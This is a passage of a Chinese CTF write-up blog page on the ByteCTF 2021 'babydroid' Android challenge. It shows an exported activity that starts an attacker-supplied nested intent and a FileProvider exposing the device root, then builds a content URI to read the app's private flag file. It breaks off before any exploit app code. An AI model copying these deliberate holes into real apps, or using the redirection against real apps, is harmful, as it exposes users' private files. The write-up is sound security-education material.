@@ -1,0 +1,509 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>由2021ByteCTF引出的intent重定向浅析 | Forgo7ten'blog</title><meta name="keywords" content="Android漏洞"><meta name="author" content="Forgo7ten"><meta name="copyright" content="Forgo7ten"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="由2021ByteCTF引出的intent重定向浅析 ¶  在此先感谢ByteCTF的赛前培训，感谢summer师傅的倾情讲解 Intent浅要概述 ¶   Intent是Android程序中各组件之间进行交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，还可以在不同组件之间传递数据。Intent一般可被用于启动活动、启动服务以及发送广播等场景。 Intent是一种运行时绑定（runtim">
+<meta property="og:type" content="article">
+<meta property="og:title" content="由2021ByteCTF引出的intent重定向浅析">
+<meta property="og:url" content="https://forgo7ten.github.io/Reverse/2021/Analysis_of_intent_redirection_derived_from_2021bytectf/index.html">
+<meta property="og:site_name" content="Forgo7ten&#39;blog">
+<meta property="og:description" content="由2021ByteCTF引出的intent重定向浅析 ¶  在此先感谢ByteCTF的赛前培训，感谢summer师傅的倾情讲解 Intent浅要概述 ¶   Intent是Android程序中各组件之间进行交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，还可以在不同组件之间传递数据。Intent一般可被用于启动活动、启动服务以及发送广播等场景。 Intent是一种运行时绑定（runtim">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://forgo7ten.gitee.io/store/imgs/15.jpg">
+<meta property="article:published_time" content="2021-10-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-17T16:00:00.000Z">
+<meta property="article:author" content="Forgo7ten">
+<meta property="article:tag" content="Android漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://forgo7ten.gitee.io/store/imgs/15.jpg"><link rel="shortcut icon" href="/images/favicon.jpg"><link rel="canonical" href="https://forgo7ten.github.io/Reverse/2021/Analysis_of_intent_redirection_derived_from_2021bytectf/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8L0ZjthONyq6-m7FniRTH8A7Bh0x-KOPZbKOcNimnYA"/><meta name="baidu-site-verification" content="code-gjVsyPt7yr"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?b076845d73a4f28b3c7401b2a0a8a9db";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "9zbibmmffi");</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '由2021ByteCTF引出的intent重定向浅析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-18 00:00:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Forgo7ten'blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-compass"></i><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fa fa-rss"></i><span> RSS订阅</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://forgo7ten.gitee.io/store/imgs/15.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Forgo7ten'blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-compass"></i><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fa fa-rss"></i><span> RSS订阅</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">由2021ByteCTF引出的intent重定向浅析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-16T16:00:00.000Z" title="发表于 2021-10-17 00:00:00">2021-10-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-17T16:00:00.000Z" title="更新于 2021-10-18 00:00:00">2021-10-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Android%E9%80%86%E5%90%91/">Android逆向</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="由2021ByteCTF引出的intent重定向浅析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="由2021ByteCTF引出的intent重定向浅析">由2021ByteCTF引出的intent重定向浅析<a class="header-anchor" href="#由2021ByteCTF引出的intent重定向浅析"> ¶ </a></h1>
+<p><strong>在此先感谢ByteCTF的赛前培训，感谢summer师傅的倾情讲解</strong></p>
+<h2 id="Intent浅要概述">Intent浅要概述<a class="header-anchor" href="#Intent浅要概述"> ¶ </a></h2>
+<ul>
+<li>Intent是Android程序中各组件之间进行交互的一种重要方式，它不仅可以指明当前组件想要执行的动作，还可以在不同组件之间传递数据。Intent一般可被用于启动活动、启动服务以及发送广播等场景。</li>
+<li>Intent是一种运行时绑定（runtime binding)机制，它能在程序运行的过程中连接两个不同的组件。通过Intent，你的程序可以向Android表达某种请求或者意愿，Android会根据意愿的内容选择适当的组件来响应。</li>
+</ul>
+<p>Intent大致可以分为两种，显式Intent和隐式Intent。</p>
+<ul>
+<li>显式Intent：直接设置目标组件的<code>ComponentName</code>(目的组件)，用于一个应用内部的消息传递，比如启动另一个Activity或者一个services。<br>
+通过Intent的<code>setComponent()</code>和<code>setClass()</code>来制定目标组件的<code>ComponentName</code>。</li>
+<li>隐式Intent：没有指定<code>ComponentName</code>，而是通过指定一系列的action和category等信息，交由系统去分析，并找出合适的组件来响应。</li>
+</ul>
+<p>同时Intent可以携带以下信息</p>
+<ol>
+<li>
+<p>component(组件)：目的组件</p>
+<p>Component属性明确指定Intent的目标组件的类名称。如果 component这个属性有指定的话，将直接使用它指定的组件（显式Intent）。指定了这个属性以后，Intent的其它所有属性都是可选的。</p>
+</li>
+<li>
+<p>Action(动作)：用来表现意图的行动</p>
+<p>Action 是一个用户定义的字符串，用于描述一个 Android 应用程序组件，一个 Intent Filter 可以包含多个 Action。在 AndroidManifest.xml 的Activity 定义时，可以在其<code> &lt;intent-filter &gt;</code>节点指定一个Action列表用于标识 Activity 所能接受的“动作”。</p>
+</li>
+<li>
+<p>category(类别)：用来表现动作的类别</p>
+<p>该属性也是通过作为<code>&lt;intent-filter&gt;</code>的子元素来声明的。如果没有指定category，将会使用默认的<code>&quot;android.intent.category.DEFAULT&quot;</code>。只有当<code>&lt;action&gt;</code>和<code>&lt;category&gt;</code>中的内容同时能够匹配上Intent中指定的action和category时，这个活动才能响应Intent。</p>
+<p>intent可以通过<code>addCategory()</code>方法指定多个<code>category</code>，只有同时满足时，才能匹配成功。</p>
+</li>
+<li>
+<p>data(数据)：表示与动作要操纵的数据</p>
+<p>Data是用一个uri对象来表示的。<code>&lt;data&gt;</code>标签可配置以下属性</p>
+<ul>
+<li><code>android:scheme</code> 。用于指定数据的协议部分，如上例中的<code>http</code>部分。</li>
+<li><code>android:host</code> 。用于指定数据的主机名部分，如上例中的<code>www.baidu.com</code>部分。</li>
+<li><code>android:port</code> 。用于指定数据的端口部分，一般紧随在主机名之后。</li>
+<li><code>android:path</code> 。用于指定主机名和端口之后的部分，如一段网址中跟在域名之后的内容。</li>
+<li><code>android:mimeType</code> 。用于指定可以处理的数据类型，允许使用通配符的方式进行指定。</li>
+</ul>
+<p>只有<code>&lt;data&gt;</code> 标签中指定的内容和Intent中携带的Data完全一致时，当前活动才能够响应该Intent。</p>
+</li>
+<li>
+<p>type(数据类型)：指定Data属性的数据类型</p>
+<p>如果Intent对象中既包含Uri又包含Type，那么，在<code>&lt;intent-filter&gt;</code>中也必须二者都包含才能通过测试。</p>
+<p>Type属性用于明确指定Data属性的数据类型或MIME类型，但是通常来说，当Intent不指定Data属性时，Type属性才会起作用，否则Android系统将会根据Data属性值来分析数据的类型，所以无需指定Type属性。</p>
+<p>data和type属性一般只需要一个，通过setData方法会把type属性设置为null，相反设置setType方法会把data设置为null，如果想要两个属性同时设置，要使用Intent.setDataAndType()方法。</p>
+</li>
+<li>
+<p>extras(扩展信息)：扩展信息</p>
+<p>提供附加数据。使用<code>putExtra()</code>方法来设置额外的key-value数据</p>
+</li>
+<li>
+<p>Flags(标志位)：期望意图的运行模式</p>
+<p>用来指示系统如何启动一个Activity（比如：这个Activity属于哪个Activity栈）和Activity启动后如何处理它(比如：是否把这个Activity归为最近的活动列表中)。</p>
+</li>
+</ol>
+<h2 id="babydroid">babydroid<a class="header-anchor" href="#babydroid"> ¶ </a></h2>
+<p>环境 API30_x86</p>
+<h3 id="漏洞分析">漏洞分析<a class="header-anchor" href="#漏洞分析"> ¶ </a></h3>
+<h4 id="服务源码文件server-py"><a target="_blank" rel="noopener" href="http://xn--server-h18il4wc39bngdo60ay2z.py">服务源码文件server.py</a><a class="header-anchor" href="#服务源码文件server-py"> ¶ </a></h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">print_to_user(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> ____              __               ____                         __     </span></span><br><span class="line"><span class="string">/\  _`\           /\ \             /\  _`\                __    /\ \    </span></span><br><span class="line"><span class="string">\ \ \L\ \     __  \ \ \____  __  __\ \ \/\ \  _ __   ___ /\_\   \_\ \   </span></span><br><span class="line"><span class="string"> \ \  _ &lt;&#x27;  /&#x27;__`\ \ \ &#x27;__`\/\ \/\ \\ \ \ \ \/\`&#x27;__\/ __`\/\ \  /&#x27;_` \  </span></span><br><span class="line"><span class="string">  \ \ \L\ \/\ \L\.\_\ \ \L\ \ \ \_\ \\ \ \_\ \ \ \//\ \L\ \ \ \/\ \L\ \ </span></span><br><span class="line"><span class="string">   \ \____/\ \__/.\_\\ \_,__/\/`____ \\ \____/\ \_\\ \____/\ \_\ \___,_\</span></span><br><span class="line"><span class="string">    \/___/  \/__/\/_/ \/___/  `/___/&gt; \\/___/  \/_/ \/___/  \/_/\/__,_ /</span></span><br><span class="line"><span class="string">                                 /\___/                                 </span></span><br><span class="line"><span class="string">                                 \/__/                                  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">    print_to_user(<span class="string">&quot;Please proof of work again, exit...\n&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print_to_user(<span class="string">&quot;Please enter your apk url:&quot;</span>)</span><br><span class="line">url = sys.stdin.readline().strip()</span><br><span class="line">EXP_FILE = download_file(url)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> check_apk(EXP_FILE):</span><br><span class="line">    print_to_user(<span class="string">&quot;Invalid apk file.\n&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print_to_user(<span class="string">&quot;Preparing android emulator. This may takes about 2 minutes...\n&quot;</span>)</span><br><span class="line">emulator = setup_emulator()</span><br><span class="line">adb([<span class="string">&quot;wait-for-device&quot;</span>])</span><br><span class="line"></span><br><span class="line">adb_install(APK_FILE)</span><br><span class="line">adb_activity(<span class="string">f&quot;<span class="subst">&#123;VULER&#125;</span>/.MainActivity&quot;</span>, wait=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(FLAG_FILE, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    adb_broadcast(<span class="string">f&quot;com.bytectf.SET_FLAG&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;VULER&#125;</span>/.FlagReceiver&quot;</span>, extras=&#123;<span class="string">&quot;flag&quot;</span>: f.read()&#125;)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">adb_install(EXP_FILE)</span><br><span class="line">adb_activity(<span class="string">f&quot;<span class="subst">&#123;ATTACKER&#125;</span>/.MainActivity&quot;</span>)</span><br><span class="line"></span><br><span class="line">print_to_user(<span class="string">&quot;Launching! Let your apk fly for a while...\n&quot;</span>)</span><br><span class="line">time.sleep(EXPLOIT_TIME_SECS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.killpg(os.getpgid(emulator.pid), signal.SIGTERM)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>h13~h15：进行了一个sha256的验证，必须满足<code>sha256((prefix+proof).encode()).hexdigest().startswith(difficulty*&quot;0&quot;) == True</code>才能继续。其中<code>prefix</code>为<code>random_hex(6)</code>随机的字符；<code>proof</code>为用户输入的字符串。可以每次爆破得到正确的结果来输入。</p>
+</li>
+<li>
+<p>h17~h22：用户输入一个url地址。server会将该文件下载下来，同时检查是否为apk。</p>
+</li>
+<li>
+<p>h24~h26：新建一个安卓模拟器</p>
+</li>
+<li>
+<p>h28：将含有漏洞的APK安装</p>
+</li>
+<li>
+<p>h29：启动受害APK</p>
+</li>
+<li>
+<p>h30~h31：打开服务器中保存的flag文件。然后通过adb命令发送一个广播，将flag传输给<code>.FlagReceiver</code>。其中命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell su root am broadcast -W -a com.bytectf.SET_FLAG -n com.bytectf.babydroid/.FlagReceiver -e flag [flag]</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>h34~h35：安装attack apk并运行</p>
+</li>
+</ul>
+<h4 id="apk分析">apk分析<a class="header-anchor" href="#apk分析"> ¶ </a></h4>
+<h5 id="AndroidManifest-xml">AndroidManifest.xml<a class="header-anchor" href="#AndroidManifest-xml"> ¶ </a></h5>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211017193925146.png" alt="image-20211017193925146"></p>
+<p>可以看到注册了两个activity，一个receiver，还有一个FileProvider。其中两个activity都是可导出（可被外部组件访问）的。</p>
+<h5 id="MainActivity">MainActivity<a class="header-anchor" href="#MainActivity"> ¶ </a></h5>
+<p>MainActivity中没有做操作，只是载入布局来显示</p>
+<h5 id="Vulnerable-易受攻击的">Vulnerable(易受攻击的)<a class="header-anchor" href="#Vulnerable-易受攻击的"> ¶ </a></h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;	</span><br><span class="line">       <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       <span class="keyword">this</span>.startActivity(<span class="keyword">this</span>.getIntent().getParcelableExtra(<span class="string">&quot;intent&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>该Activity通过<code>getIntent()</code>首先获得intent对象，之后使用<code>getParcelableExtra(&quot;intent&quot;)</code>，获取反序列化后名为<code>&quot;intent&quot;</code>的extra数据，并使用<code>startActivity()</code>来启动该intent。</p>
+<h5 id="FlagReceiver">FlagReceiver<a class="header-anchor" href="#FlagReceiver"> ¶ </a></h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context,Intent intent)</span></span>&#123;	</span><br><span class="line">   String flag;</span><br><span class="line">   String str = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span> ((flag = intent.getStringExtra(str)) != <span class="keyword">null</span>) &#123;	</span><br><span class="line">      File file = <span class="keyword">new</span> File(context.getFilesDir(), str);</span><br><span class="line">      <span class="keyword">this</span>.writeFile(file, flag);</span><br><span class="line">      Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">   &#125;	</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该广播接收者从intent中取到一个key为<code>&quot;flag&quot;</code>的String类型数据，之后将其写出到<code>/data/data/[package_name]/files/flag</code>文件中。对应了server.py中传入flag的逻辑。我们想要获取的flag也就是这个路径。</p>
+<h5 id="FileProvider">FileProvider<a class="header-anchor" href="#FileProvider"> ¶ </a></h5>
+<p><a target="_blank" rel="noopener" href="https://developer.android.google.cn/reference/androidx/core/content/FileProvider?hl=en">FileProvider  | Android Developers (google.cn)</a></p>
+<p>FileProvider是<code>ContentProvider</code>的一个特殊的子类，通过使用<code>content://uri</code>来代替<code>file://uri</code>，来促进安全的共享与app关联的文件。</p>
+<p>content URI允许临时的授予该文件的读写权限。所以当创建一个包含文件content URI的时候，（如果需要）可以通过<code>Intent.setFlags()</code>添加相应的权限。同时权限会通过Intent传递给接收的activity（或者服务）</p>
+<p>在创建FileProvider时，需提供一个xml文件来指定该provider提供的文件。如<code>res/xml/file_paths.xml</code>，其中提供了相应的映射路径以及别名。同时需要在AndroidManifest.xml中的FileProvider对应的节点内定义<code>  &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot; &gt;</code>来声明。（其中resource属性内为提供的xml文件）</p>
+<p>该APK的指定文件xml中定义如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><code>&lt;root-path&gt;</code>节点：代表设备的根目录</p>
+<p>另外的节点</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211017202244871.png" alt="image-20211017202244871"></p>
+</li>
+<li>
+<p><code>name</code>属性：给该目录起的别名，用于隐藏路径</p>
+</li>
+<li>
+<p><code>path</code>属性：临时授权访问的路径（该目录下的子目录</p>
+</li>
+</ul>
+<p>则该APK提供的FileProvider提供了根目录，通过<code>root/</code>别名来访问</p>
+<p>则如果我们想访问flag的存储路径，实际构造的部分uri应该为<code>root/data/data/[package_name]/files/flag</code>。</p>
+<h3 id="利用思路">利用思路<a class="header-anchor" href="#利用思路"> ¶ </a></h3>
+<h4 id="FlagURI">FlagURI<a class="header-anchor" href="#FlagURI"> ¶ </a></h4>
+<p>题目将flag存储到了<code>/data/data/[package_name]/files/flag</code>文件。同时提供了一个FileProvider，则思路是通过FileProvider来将该文件读取。</p>
+<p>首先需要构造一个content URI。格式为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://[authorities]/[name]/[file_relative_path]</span><br></pre></td></tr></table></figure>
+<p>则构造的URI为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</span><br></pre></td></tr></table></figure>
+<h4 id="获得权限">获得权限<a class="header-anchor" href="#获得权限"> ¶ </a></h4>
+<p>由于该<code>FileProvider</code>的<code>exported</code>属性（必须）设置为<code>false</code>。导致我们无法在外部组件中直接使用该provider。</p>
+<p>但是该apk提供了一个<code>Vulnerable</code>Activity，并且（不做任何校验的）将接收到的intent内中的key为<code>&quot;intent&quot;</code>的extra数据当作intent，并使用<code>startActivity()</code>来启动。这样就对启动的activity进行了临时的授权，可以访问该应用中未导出的组件。</p>
+<p>因此，我们可以设置一个intent来启动<code>Vulnerable</code>，同时给该Intent附加一个key为<code>intent</code>的数据，该数据包含着构造好的恶意intent。</p>
